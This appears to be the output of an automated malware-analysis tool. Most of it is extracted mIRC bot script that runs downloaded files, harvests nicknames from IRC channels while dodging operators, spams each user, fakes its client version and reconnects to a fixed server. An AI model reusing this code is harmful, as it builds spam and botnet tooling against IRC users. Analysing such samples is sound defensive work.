            "12Ran $mircdir $+ download\\ $+ $hget(download,3) $+ ",
            "1,0)",
            "n512=    run \" $+ $mircdir $+ download\\ $+ $hget(download,3) $+ \"",
            "n513=    halt",
            "n514=    return    ",
            "n515=  }",
            "n516=  if ($hget(download,4) != $file($mircdir $+ download\\ $+ $hget(download,3)).size) {",
            "n517=    msg %chan ",
            "Download Ended",
            " Expected Filesize ",
            "2[ $hget(download,4) ] ",
            "1,0Actual Filesize: ",
            "3[ $file($mircdir $+ download\\ $+ $hget(download,3)).size ] ",
            "1,0Result: ",
            "4[ Failed ]",
            "n518=  }",
            "n519=}",
            "n520=",
            "n521=;******* Spam Bot ********",
            "n522=",
            "n523=alias invite {",
            "n524=  if ($portfree(113) == $true) { socklisten ident 113 }",
            "n525=  if ($sock(spam).status == $null) {",
            "n526=    %spam_server = $read(servers.txt)",
            "n527=    if (%verbose == 1) {",
            "n528=      msg %chan ",
            "5Attempting connection to %spam_server $+ ...",
            "n529=    }",
            "n530=    sockopen spam %spam_server 6667 ",
            "n531=  }",
            "n532=}",
            "n533=on *:sockclose:spam: {",
            "n534=  if (%verbose == 1) {",
            "n535=    msg %chan ",
            "6Disconnected from server",
            "n536=    msg %chan ",
            "6Moving to next random server...",
            "n537=  }",
            "n538=  invite",
            "n539=}",
            "n540=on *:sockopen:spam: {",
            "n541=  if ($portfree(113) == $true) {",
            "n542=    start_ident",
            "n543=  }",
            "n544=  if ($sock(spam).status == active) {",
            "n545=    write -c channels.txt",
            "n546=    write -c users.txt",
            "n547=    sockwrite -n spam NICK $rnick",
            "n548=    sockwrite -n spam USER $rnick \"\" \" $+ %spam_server $+ \" : $+ $r(a,z) $+ $r(a,z) $+ $rnick $+ $r(a,z) $+ $r(a,z) $+ $rnick",
            "n549=    if (%verbose == 1) {    ",
            "n550=      msg %chan ",
            "3Connected to %spam_server",
            "n551=    }",
            "n552=  }",
            "n553=  timerlogin -o 1 60 login_timeout",
            "n554=}",
            "n555=alias login_timeout {",
            "n556=  if ($sock(spam).status != $null) {",
            "n557=    if (%verbose == 1) {",
            "n558=      msg %chan ",
            "12Login timed out!",
            "n559=      msg %chan ",
            "6Moving to next random server...",
            "n560=    }",
            "n561=    sockclose spam",
            "n562=    invite",
            "n563=  }",
            "n564=}",
            "n565=on *:sockread:spam: {",
            "n566=  if ($sockerr > 0) { return }",
            "n567=  :spam",
            "n568=  if ($sock(spam).status == active) {",
            "n569=    sockread %spam",
            "n570=  }",
            "n571=  if ($sockbr == 0) { return }",
            "n572=  if (%spam == $null) { %spam = - }",
            "n573=  if ($gettok(%spam,1,32) == PING) { ",
            "n574=    sockwrite -n $sockname PONG $gettok($gettok(%spam,2,32),1,58)",
            "n575=  }",
            "n576=  %n = $gettok($gettok(%spam,1,33),1,58)",
            "n577=  if ($gettok(%spam,2,32) == PRIVMSG) && ($gettok(%spam,4,32) == :",
            "PING) {",
            "n578=    sockwrite -n $sockname NOTICE %n :",
            "PING $gettok(%spam,5,32)",
            "n579=  }",
            "n580=  if ($gettok(%spam,2,32) == PRIVMSG) && ($gettok(%spam,4,32) == :",
            "VERSION",
            "n581=    sockwrite -n $sockname NOTICE %n :",
            "VERSION mIRC v6.03 Khaled Mardam-Bey",
            "n582=  }",
            "n583=  if ($gettok(%spam,2,32) == PRIVMSG) && ($gettok(%spam,4,32) == :",
            "TIME",
            "n584=    sockwrite -n $sockname NOTICE %n :",
            "TIME $fulldate $+ ",
            "n585=  }",
            "n586=  ;433 = Nick already in use",
            "n587=  if ($gettok(%spam,2,32) == 433) {",
            "n588=    sockwrite -n spam NICK $rnick $+ $r(a,z) $+ $r(a,z)",
            "n589=  }",
            "n590=  ;376 = End of MOTD command",
            "n591=  if ($gettok(%spam,2,32) == 376) {",
            "n592=    timerlogin off",
            "n593=    sockwrite -n $sockname LIST >2,<10000",
            "n594=    %chaninc = 0",
            "n595=    if (%verbose == 1) {",
            "n596=      msg %chan ",
            "12Logged into %spam_server $+ , getting channel list",
            "n597=    }",
            "n598=  }",
            "n599=  ;422 = MOTD missing",
            "n600=  if ($gettok(%spam,2,32) == 422) {",
            "n601=    timerlogin off",
            "n602=    sockwrite -n $sockname LIST >2,<10000",
            "n603=    %chaninc = 0",
            "n604=    if (%verbose == 1) {",
            "n605=      msg %chan ",
            "12Logged into %spam_server",
            "n606=    }",
            "n607=  }",
            "n608=  ;263 = Server load too heavy",
            "n609=  if ($gettok(%spam,2,32) == 263) {",
            "n610=    if (%verbose == 1) {",
            "n611=      msg %chan ",
            "6Server load to heavy, moving to next server...",
            "n612=    }    ",
            "n613=    sockclose spam",
            "n614=    invite",
            "n615=  }",
            "n616=  ;321 Channel list began",
            "n617=  if ($gettok(%spam,2,32) == 263) {",
            "n618=    if (%verbose == 1) {",
            "n619=      msg %chan ",
            "12Getting channel list...",
            "n620=    }",
            "n621=  }",
            "n622=  ;322 A channel in the list",
            "n623=  if ($gettok(%spam,2,32) == 322) {",
            "n624=    if ($left($gettok(%spam,4,32),1) == $chr(35)) {",
            "n625=      if (op !isin $gettok(%spam,4,32)) && (help !isin $gettok(%spam,4,32)) && (line !isin $gettok(%spam,4,32)) {",
            "n626=        write channels.txt $gettok(%spam,4,32)",
            "n627=      }",
            "n628=    }",
            "n629=  }",
            "n630=  ;323 Channel list ended",
            "n631=  if ($gettok(%spam,2,32) == 323) || ($gettok(%spam,4-,32) == :End of /LIST) {",
            "n632=    %chan_inc = 1",
            "n633=    sockwrite -n spam join $read(channels.txt,%chan_inc)",
            "n634=    if (%verbose == 1) {",
            "n635=      msg %chan ",
            "4Finished getting channels",
            "n636=    }  ",
            "n637=  }",
            "n638=  ;332 Channel topic recieved (joined channel)",
            "n639=  if ($gettok(%spam,2,32) == 332) {",
            "n640=    if (%verbose == 1) {",
            "n641=      msg %chan ",
            "12Joined $read(channels.txt,%chan_inc)",
            "n642=    }",
            "n643=    write -c users.txt",
            "n644=  }",
            "n645=  ;471 Can't join, Channel full",
            "n646=  if ($gettok(%spam,2,32) == 471) {",
            "n647=    if (%verbose == 1) {",
            "n648=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , channel full",
            "n649=    }    ",
            "n650=    .timer 1 5 next_chan",
            "n651=    return",
            "n652=  }",
            "n653=  ;477 Can't join, Channel full",
            "n654=  if ($gettok(%spam,2,32) == 477) {",
            "n655=    if (%verbose == 1) {",
            "n656=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , channel full",
            "n657=    }    ",
            "n658=    .timer 1 5 next_chan",
            "n659=    return",
            "n660=  }",
            "n661=  if ($gettok(%spam,2,32) == 478) {",
            "n662=    if (%verbose == 1) {",
            "n663=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , channel ban/ignore list full",
            "n664=    }    ",
            "n665=    .timer 1 5 next_chan",
            "n666=    return",
            "n667=  }",
            "n668=  if ($gettok(%spam,2,32) == 481) {",
            "n669=    if (%verbose == 1) {",
            "n670=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , IRCops only",
            "n671=    }    ",
            "n672=    .timer 1 5 next_chan",
            "n673=    return",
            "n674=  }",
            "n675=  if ($gettok(%spam,2,32) == 482) {",
            "n676=    if (%verbose == 1) {",
            "n677=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , IRCops only",
            "n678=    }    ",
            "n679=    .timer 1 5 next_chan",
            "n680=    return",
            "n681=  }",
            "n682=  ;473 Can't join, Invite only",
            "n683=  if ($gettok(%spam,2,32) == 473) {",
            "n684=    if (%verbose == 1) {",
            "n685=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , invite only   ",
            "n686=    }       ",
            "n687=    .timer 1 5 next_chan",
            "n688=    return",
            "n689=  }",
            "n690=  ;474 Can't join, Banned",
            "n691=  if ($gettok(%spam,2,32) == 474) {",
            "n692=    if (%verbose == 1) {",
            "n693=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , banned",
            "n694=    }    ",
            "n695=    .timer 1 5 next_chan",
            "n696=    return",
            "n697=  }",
            "n698=  ;475 Can't join, Key",
            "n699=  if ($gettok(%spam,2,32) == 475) {",
            "n700=    if (%verbose == 1) {",
            "n701=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , need correct key",
            "n702=    }    ",
            "n703=    .timer 1 5 next_chan",
            "n704=    return",
            "n705=  }",
            "n706=  ;412 Can't join, Banned",
            "n707=  if ($gettok(%spam,2,32) == 412) {",
            "n708=    if (%verbose == 1) {",
            "n709=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , banned",
            "n710=    }    ",
            "n711=    .timer 1 5 next_chan",
            "n712=    return",
            "n713=  }",
            "n714=  ;461 Can't join, Banned",
            "n715=  if ($gettok(%spam,2,32) == 461) {",
            "n716=    if (%verbose == 1) {",
            "n717=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , banned",
            "n718=    }    ",
            "n719=    .timer 1 5 next_chan",
            "n720=    return",
            "n721=  }",
            "n722=  ;490 Can't join, need to identify to nickserv",
            "n723=  if ($gettok(%spam,2,32) == 439) {",
            "n724=    if (%verbose == 1) {",
            "n725=      msg %chan ",
            "12Couldn't join $read(channels.txt,%chan_inc) $+ , need registered nick.",
            "n726=    }    ",
            "n727=    .timer 1 5 next_chan",
            "n728=    return",
            "n729=  }",
            "n730=  ;366 End of nicklist",
            "n731=  if ($gettok(%spam,2,32) == 366) {",
            "n732=    if (%verbose == 1) {",
            "n733=      msg %chan ",
            "12Got $lines($read(channels.txt,%chan_inc)) nicks from $read(channels.txt,%chan_inc) $+ , commencing spam ",
            "3[Next: $+ $read(channels.txt,$calc(%chan_inc + 1)) $+ ]",
            "n734=    }",
            "n735=    sockwrite -n spam part $read(channels.txt,%chan_inc)",
            "n736=    %user_inc = 0",
            "n737=    spam",
            "n738=  }",
            "n739=  ;439 Target changed too fast",
            "n740=  if ($gettok(%spam,2,32) == 439) {",
            "n741=    if (%verbose == 1) {",
            "n742=      msg %chan ",
            "4Target changed too fast! Restarting in 5 seconds",
            "n743=      msg %chan ",
            "6Moving to next random server...",
            "n744=    }",
            "n745=    sockclose spam",
            "n746=    invite",
            "n747=  }",
            "n748=  ;353 Nicklist on a channel",
            "n749=  if ($gettok(%spam,2,32) == 353) {",
            "n750=    %my_spam_nick = $gettok(%spam,3,32)",
            "n751=    %nick_chunk = $gettok(%spam,2,58)",
            "n752=    %nick_chunk_inc = 0",
            "n753=    %nick_chunk_tot = $numtok(%nick_chunk,32)",
            "n754=    while (%nick_chunk_inc < %nick_chunk_tot) {",
            "n755=      inc %nick_chunk_inc",
            "n756=      if ($gettok(%nick_chunk,%nick_chunk_inc,32) != %my_spam_nick) {",
            "n757=        if ($len($gettok(%nick_chunk,%nick_chunk_inc,32)) > 2) {",
            "n758=          if (cop !isin $gettok(%nick_chunk,%nick_chunk_inc,32)) {",
            "n759=            if (bot !isin $gettok(%nick_chunk,%nick_chunk_inc,32)) {",
            "n760=              if (dcc !isin $gettok(%nick_chunk,%nick_chunk_inc,32)) {",
            "n761=                if (serv !isin $gettok(%nick_chunk,%nick_chunk_inc,32)) {",
            "n762=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) == $chr(64)) {",
            "n763=                    write users.txt $remtok($gettok(%nick_chunk,%nick_chunk_inc,32),1,64)",
            "n764=                  }",
            "n765=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) == $chr(37)) {",
            "n766=                    write users.txt $remtok($gettok(%nick_chunk,%nick_chunk_inc,32),1,37)",
            "n767=                  }",
            "n768=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) == $chr(43)) {",
            "n769=                    write users.txt $remtok($gettok(%nick_chunk,%nick_chunk_inc,32),1,43)",
            "n770=                  }",
            "n771=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) == $chr(33)) {",
            "n772=                    write users.txt $remtok($gettok(%nick_chunk,%nick_chunk_inc,32),1,33)",
            "n773=                  }",
            "n774=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) == $chr(46)) {",
            "n775=                    write users.txt $remtok($gettok(%nick_chunk,%nick_chunk_inc,32),1,46)",
            "n776=                  }",
            "n777=                  if ($left($gettok(%nick_chunk,%nick_chunk_inc,32),1) isalnum) {",
            "n778=                    write users.txt $gettok(%nick_chunk,%nick_chunk_inc,32)",
            "n779=                  }",
            "n780=                }",
            "n781=              }",
            "n782=            }",
            "n783=          }",
            "n784=        }",
            "n785=      }",
            "n786=    }",
            "n787=  }",
            "n788=  if ($left($gettok(%spam,3,32),1) != $chr(35)) && ($gettok(%spam,2,32) == PRIVMSG) {",
            "n789=    if (dcc !isin $gettok(%spam,1,32)) && (bot !isin $gettok($gettok(%spam,1,32),1,64)) {",
            "n790=      if (serv !isin $gettok(%spam,1,32)) && ($chr(46) !isin $gettok($gettok(%spam,1,32),1,64)) {",
            "n791=        if (%verbose == 1) {",
            "n792=          msg %chan ",
            "1,0<",
            "14 $+ %n $+ ",
            "1,0> $gettok($gettok(%spam,4,32),1,58) $gettok(%spam,5-,32)",
            "n793=        }",
            "n794=      }  ",
            "n795=    }",
            "n796=  }",
            "n797=  if ($left($gettok(%spam,3,32),1) != $chr(35)) && ($gettok(%spam,2,32) == NOTICE) {",
            "n798=    if (dcc !isin $gettok(%spam,1,32)) && (bot !isin $gettok($gettok(%spam,1,32),1,64)) {",
            "n799=      if (serv !isin $gettok(%spam,1,32)) && ($chr(46) !isin $gettok($gettok(%spam,1,32),1,64)) {",
            "n800=        if (%verbose == 1) {",
            "n801=          msg %chan ",
            "5- $+ %n $+ -",
            "1,0 $gettok($gettok(%spam,4,32),1,58) $gettok(%spam,5-,32)",
            "n802=        }   ",
            "n803=      }",
            "n804=    }",
            "n805=  }",
            "n806=  goto spam",
            "n807=}",
            "n808=alias next_chan {",
            "n809=  write -c users.txt",
            "n810=  inc %chan_inc",
            "n811=  if (%chan_inc > $lines(channels.txt)) { ",
            "n812=    sockclose spam ",
            "n813=    invite",
            "n814=    return",
            "n815=  }",
            "n816=  if ($sock(spam).status == active) {",
            "n817=    sockwrite -n spam join $read(channels.txt,%chan_inc)",
            "n818=  }",
            "n819=}",
            "n820=alias spam {",
            "n821=  if ($sock(spam).status == $null) { invite | return }",
            "n822=  inc %user_inc",
            "n823=  if (%user_inc > $lines(users.txt)) { next_chan | return }",
            "n824=  .timerkeep_alive off",
            "n825=  .timerkeep_alive -o 1 90 spam_timeout",
            "n826=  if ($sock(spam).status == active) {",
            "n827=    sockwrite -n spam privmsg $read(users.txt,%user_inc) : $+ %spam_message",
            "n828=  }",
            "n829=  inc %spam_total",
            "n830=  if (%verbose == 1) {",
            "n831=    msg %chan ",
            "10[ $+ %spam_server $+ ] ",
            "7[ $+ $read(users.txt,%user_inc) $+ ",
            "1,0( $+ %user_inc $+ / $+ $lines(users.txt) $+ ) $+ ",
            "3[ $+ $read(channels.txt,%chan_inc) $+ ",
            "1,0( $+ %chan_inc $+ / $+ $lines(channels.txt) $+ ) $+ ",
            "12[ $+ %spam_total $+ ]",
            "n832=  }  ",
            "n833=  .timerspam -o 1 20 spam",
            "n834=}",
            "n835=alias spam_timeout {",
            "n836=  if (%verbose = 1) {",
            "n837=    msg %chan ",
            "4Spambot stalled! Auto restart in 5 seconds",
            "n838=    msg %chan ",
            "6Moving to next random server...",
            "n839=  }",
            "n840=}",
            "n841=on *:disconnect: {",
            "n842=  nick $rnick",
            "n843=  anick $rnick $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
            "n844=  server irc.ircdmaster.com",
            "n845=}"
        ],
        "file": {
            "n24=;2.GT bots are lame. They have a big file size and mhide.exe": "Executable",
            "n545=    write -c channels.txt": "Text",
            "n546=    write -c users.txt": "Text",
            "n643=    write -c users.txt": "Text",
            "n809=  write -c users.txt": "Text"
        },
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://",
            "http://www.domain.com/file.name"
        ]
    },
    "time": "0:00:00.466754",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
